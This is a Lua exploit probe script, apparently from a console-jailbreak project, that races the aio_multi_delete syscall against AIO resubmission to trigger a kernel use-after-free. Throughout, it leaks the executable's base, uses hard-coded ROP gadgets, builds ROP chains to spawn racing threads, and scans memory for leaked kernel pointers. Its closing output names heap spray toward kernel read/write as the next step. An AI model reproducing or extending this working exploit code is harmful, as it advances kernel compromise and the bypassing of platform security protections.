-- CRASH_CLASS: HIGH
-- PROBE 65d: aio_multi_delete TOCTOU race (Coixao/prolapse lead)
--
-- Context: 14.10→14.20 diff shows aio_multi_delete drops a lock to
-- re-acquire the AIO object. A racing thread can free+reallocate that
-- slot in the gap. 14.10 then frees sub-objects of the attacker-swapped
-- object → use-after-free / double-free.
--
-- 352p proved the generation IS checked at the API level (bumped gen →
-- 0x80020003), but the TOCTOU is inside: the initial lookup passes,
-- the lock drops, a second thread deletes+resubmits, the first thread
-- reacquires without re-checking the generation.
--
-- Strategy:
--   1. Submit AIO request via 669 → get valid ID
--   2. Spawn child thread (thr_new ROP) that calls 662(ID) to delete
--   3. Main thread simultaneously calls 662(ID) + 669 to refill slot
--   4. Check for anomalous states, kernel pointers, or crash patterns
--   5. Repeat across thread budget

print("=== PROBE 65d: aio_multi_delete TOCTOU race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets (confirmed in 272a/384b)
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSEGV(11) + SIGSYS(12)
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Fake TCB for child threads
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- AIO init (670) — required before any AIO ops
print("")
print("[A] AIO init")
local ok670, rv670 = pcall(function() return mk(670)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
print("  670 init ret=" .. (ok670 and sgn(rv670) or "EXC"))

-- Open /dev/zero for AIO targets
local fd_zero = -1
repeat
    local ok, rv = pcall(function() return mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)) end)
    if ok then fd_zero = sgn(rv) end
until true
print("  /dev/zero fd=" .. fd_zero)
if fd_zero < 0 then print("ABORT: no /dev/zero"); return end

-- AIO buffers
local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local result = memory.alloc(0x100)
local ids_main = memory.alloc(0x100)    -- main thread's ID buffer
local ids_child = memory.alloc(0x100)   -- child thread's ID buffer (separate)
local states_main = memory.alloc(0x100)
local states_child = memory.alloc(0x100)

local function zero_buf(addr, n)
    for i = 0, n - 1, 4 do wd(N(addr) + i, 0) end
end

local function fill_req(base, off, len, buf, res, fd)
    wq(N(base) + 0x00, uint64(off))
    wq(N(base) + 0x08, uint64(len))
    local bh, bl = get_hi_lo(buf)
    wd(N(base) + 0x10, bl); wd(N(base) + 0x14, bh)
    local rh, rl = get_hi_lo(res)
    wd(N(base) + 0x18, rl); wd(N(base) + 0x1C, rh)
    wd(N(base) + 0x20, fd)
    wd(N(base) + 0x24, 0)
end

local function submit_aio()
    fill_req(reqs, 0, 16, uint64(N(data)), uint64(N(result)), fd_zero)
    wd(N(result), 0)
    wd(N(ids_main), 0)
    local ok, rv = pcall(function()
        return mk(669)(uint64(1), reqs, uint64(1), uint64(1), ids_main)
    end)
    local id = rd(N(ids_main)) or 0
    return ok and sgn(rv) or nil, id
end

local function delete_aio_main(id)
    wd(N(ids_main), id)
    wd(N(states_main), 0xDEAD0001)
    local ok, rv = pcall(function()
        return mk(662)(ids_main, uint64(1), states_main)
    end)
    local state = rd(N(states_main)) or 0
    return ok and sgn(rv) or nil, state
end

-- [B] Sanity: submit + delete cycle
print("")
print("[B] AIO sanity check")
local s_ret, s_id = submit_aio()
print(string.format("  submit ret=%s id=0x%08X", tostring(s_ret), s_id))
if s_ret ~= 0 or s_id == 0 then
    print("  ABORT: AIO submit failed, cannot race")
    return
end
local d_ret, d_state = delete_aio_main(s_id)
print(string.format("  delete ret=%s state=0x%08X", tostring(d_ret), d_state))

-- Verify we can submit again (slot reuse)
local s2_ret, s2_id = submit_aio()
print(string.format("  resubmit ret=%s id=0x%08X", tostring(s2_ret), s2_id))
local d2_ret, d2_state = delete_aio_main(s2_id)
print(string.format("  redelete ret=%s state=0x%08X", tostring(d2_ret), d2_state))

if not alive() then print("DEAD after sanity"); return end

-- [C] RACE LOOP
-- For each iteration:
--   1. Submit AIO → get valid ID
--   2. Copy ID into child's buffer
--   3. Spawn child: sysarch(SET_FSBASE) + 662(ids_child, 1, states_child)
--   4. Main thread busy-loops a few cycles, then calls 662 on same ID
--   5. Main thread immediately resubmits 669 to refill the slot
--   6. Check child's states_child for anomalies
print("")
print("[C] TOCTOU race loop")

local RACE_ITERS = 8     -- conservative: thread budget ~9-25
local anomalies = 0
local kptrs = 0
local double_success = 0  -- both threads report successful delete

for iter = 1, RACE_ITERS do
    if not alive() then
        print(string.format("  iter %d: DEAD (crash = possible UAF trigger)", iter))
        break
    end

    -- Submit fresh AIO object
    local sr, sid = submit_aio()
    if sr ~= 0 or sid == 0 then
        print(string.format("  iter %d: submit failed ret=%s id=0x%X", iter, tostring(sr), sid))
        break
    end

    -- Prepare child's ID + state buffers
    wd(N(ids_child), sid)
    wq(N(states_child), uint64(0xBAD0DEAD))

    -- Build child ROP chain: sysarch(SET_FSBASE) + 662(ids_child, 1, states_child) + thr_exit
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    for i = 0, ss - 1, 4 do wd(sb + i, 0) end  -- zero stack

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- Phase 0: sysarch(129, &fs_ptr) — set FS base for errno handling
    emit(g_pop_rdi);  emit(uint64(129))
    emit(g_pop_rsi);  emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);  emit(uint64(165))    -- SYS_sysarch
    emit(stub)

    -- Phase 1: 662(ids_child, 1, states_child) — aio_multi_delete
    emit(g_pop_rdi);  emit(uint64(N(ids_child)))
    emit(g_pop_rsi);  emit(uint64(1))
    emit(g_pop_rdx);  emit(uint64(N(states_child)))
    emit(g_pop_rax);  emit(uint64(662))
    emit(stub)

    -- Phase 2: thr_exit(0)
    emit(g_pop_rdi);  emit(uint64(0))
    emit(g_pop_rax);  emit(uint64(431))
    emit(stub)

    -- thr_param
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, g_bare_ret)
    wq(pa + 8, uint64(0))         -- arg (don't care)
    wq(pa + 0x10, uint64(sb))     -- stack_base
    wq(pa + 0x18, uint64(ss))     -- stack_size
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)

    -- Spawn child
    local ok_t, rv_t = pcall(function() return mk(455)(par, uint64(0x38)) end)
    if not ok_t or N(rv_t) ~= 0 then
        print(string.format("  iter %d: thr_new failed", iter))
        break
    end

    -- RACE WINDOW: main thread does 662 on the same ID concurrently with child
    -- Then immediately resubmit to refill the slot
    wd(N(states_main), 0xDEAD0002)
    local ok662, rv662 = pcall(function()
        return mk(662)(ids_main, uint64(1), states_main)
    end)
    local main_ret = ok662 and sgn(rv662) or -999
    local main_state = rd(N(states_main)) or 0

    -- Resubmit immediately to refill the freed slot
    local rs_ret, rs_id = submit_aio()

    -- Wait for child to finish
    for w = 1, 20000 do local _ = rd(sb) end

    -- Read child's result
    local child_state_raw = rq(N(states_child))
    local csh, csl = get_hi_lo(child_state_raw)

    -- Analyze results
    local main_ok = (main_state == 0x00000000)     -- successful delete
    local child_ok = (csl == 0x00000000 and csh == 0)  -- successful delete
    local child_unk = (csl == 0x80020003)           -- unknown ID (lost race)
    local child_sentinel = (csl == 0xBAD0DEAD)      -- never wrote (child didn't run)

    -- DOUBLE SUCCESS = both threads deleted the same object → the second one
    -- operated on whatever was in the slot after reallocation
    if main_ok and child_ok then
        double_success = double_success + 1
        print(string.format("  iter %d: *** DOUBLE DELETE *** main=0x%X child=0x%X resubmit_id=0x%X",
            iter, main_state, csl, rs_id or 0))
    end

    -- Check for kernel pointers in state output
    if csh ~= 0 and csh ~= 0xFFFFFFFF and csh >= 0xFFFF8000 then
        kptrs = kptrs + 1
        print(string.format("  iter %d: *** KERNEL POINTER in child state: %s ***", iter, fmt(child_state_raw)))
    end

    -- Check for unexpected state values (not 0, not 0x80020003, not sentinel)
    if not child_sentinel and not child_ok and not child_unk and csl ~= 0xBAD0DEAD then
        anomalies = anomalies + 1
        print(string.format("  iter %d: anomaly child_state=%s main_state=0x%X",
            iter, fmt(child_state_raw), main_state))
    end

    -- Normal trace (compact)
    if not (main_ok and child_ok) and anomalies == 0 and kptrs == 0 then
        if iter <= 3 or iter == RACE_ITERS then
            print(string.format("  iter %d: main_state=0x%X child=%s resubmit=0x%X",
                iter, main_state, fmt(child_state_raw), rs_id or 0))
        elseif iter == 4 then
            print("  ...")
        end
    end

    -- Clean up the resubmitted AIO if any
    if rs_ret == 0 and rs_id and rs_id ~= 0 then
        delete_aio_main(rs_id)
    end
end

-- [D] Scan sentinel pages for kernel pointer contamination
print("")
print("[D] post-race kernel pointer scan")
local scan_addrs = {states_main, states_child, ids_main, ids_child, result}
local scan_names = {"states_main", "states_child", "ids_main", "ids_child", "result"}
for si = 1, #scan_addrs do
    for off = 0, 0x3C, 8 do
        local v = rq(N(scan_addrs[si]) + off)
        if v then
            local h, l = get_hi_lo(v)
            if h >= 0xFFFF8000 then
                print(string.format("  *** KPTR in %s+0x%X: %s ***", scan_names[si], off, fmt(v)))
                kptrs = kptrs + 1
            end
        end
    end
end

-- [E] Summary
print("")
print("[E] SUMMARY")
print(string.format("  race iterations: %d", RACE_ITERS))
print(string.format("  double deletes:  %d", double_success))
print(string.format("  anomalies:       %d", anomalies))
print(string.format("  kernel pointers: %d", kptrs))
if double_success > 0 then
    print("")
    print("*** DOUBLE DELETE DETECTED ***")
    print("Both threads successfully deleted the same AIO slot.")
    print("The second delete operated on a reallocated object → UAF confirmed.")
    print("Next: control what fills the slot (heap spray) to get kernel R/W.")
end
if kptrs > 0 then
    print("")
    print("*** KERNEL POINTER LEAKED ***")
end
if double_success == 0 and kptrs == 0 and anomalies == 0 then
    print("")
    print("No race hit in this run. May need tighter timing or more iterations.")
    print("Thread budget limits attempts per connection.")
end

print("")
print("canary=" .. (alive() and "OK" or "DEAD"))
print("=== 65d COMPLETE ===")
